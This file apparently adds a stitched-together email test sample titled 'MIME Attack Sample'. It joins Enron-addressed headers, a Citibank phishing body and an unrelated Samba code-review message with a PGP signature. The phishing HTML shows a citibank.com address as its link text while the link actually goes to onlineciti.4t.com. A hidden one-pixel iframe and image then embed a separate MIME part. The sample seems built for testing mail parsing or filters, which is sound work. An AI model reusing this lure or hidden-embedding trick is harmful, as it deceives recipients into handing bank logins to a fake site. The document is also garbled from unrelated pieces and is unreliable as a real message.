@@ -1,0 +1,86 @@
+From: billm@hammondshomes.com
+To: rick.johnson@enron.com, terrie.james@enron.com, karen.denne@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="Windows-1250"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20090923145007.006333F6A8@fbwmmp27.amhost.net>
+To: undisclosed-recipients:;
+Content-Length: 544
+Lines: 20
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1176
+
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY bgcolor=#FFFFFF leftmargin=5 topmargin=5 rightmargin=5 bottommargin=5>
+<FONT size=2 color=#000000 face="Arial">
+<DIV>
+You have a new message from Citibank.</DIV>
+<DIV>
+&nbsp;</DIV>
+<DIV>
+For your protection please follow the link below to view this message securely on Citibank site:</DIV>
+<DIV>
+&nbsp;</DIV>
+<DIV>
+<A href="http://onlineciti.4t.com/alert.htm"><FONT color=#0000FF><U>http://www.citibank.com/us/alert.htm</U></FONT></A></DIV>
+<DIV>
+&nbsp;</DIV>
+<DIV>
+&nbsp;</DIV>
+</FONT>
+</BODY></HTML>
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Hey Michael,
+
+obnox@samba.org wrote:
+> +/* If you are looking for "dn_lookup": Yes, it used to be here!
+> + * It has gone now since it was a major speed bottleneck in
+> + * lookup_groupmem (its only use). It has been replaced by
+> + * an rpc lookup sids call... R.I.P. */
+
+nice comment :-)
+
+
+> -		if (lookup_cached_sid(mem_ctx, &sid, &domain_name, &name, &name_type)) {
+> -
+> -			DEBUG(10,("ads: lookup_groupmem: got sid %s from cache\n", 
+> -				sid_string_static(&sid)));
+> -
+> -			(*names)[*num_names] = CONST_DISCARD(char *,name);
+> -			(*name_types)[*num_names] = name_type;
+> -			sid_copy(&(*sid_mem)[*num_names], &sid);
+> -
+
+Hm, what was the reason the remove the frontend cache for lookups that
+we already have done and go out to the network with every query?
+
+Guenther
+
+- --
+Günther Deschner                    GPG-ID: 8EE11688
+Red Hat                         gdeschner@redhat.com
+Samba Team                              gd@samba.org
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (GNU/Linux)
+Comment: Using GnuPG with Fedora - http://enigmail.mozdev.org
+
+iD8DBQFGUw3mSOk3aI7hFogRAt5mAJ99MQ+6XUMFYKZIk2MkYNnnEBbBsQCeOcWp
+r67jleG9HfS/EGCQFDkuPKs=
+=+CJb
+-----END PGP SIGNATURE-----
+
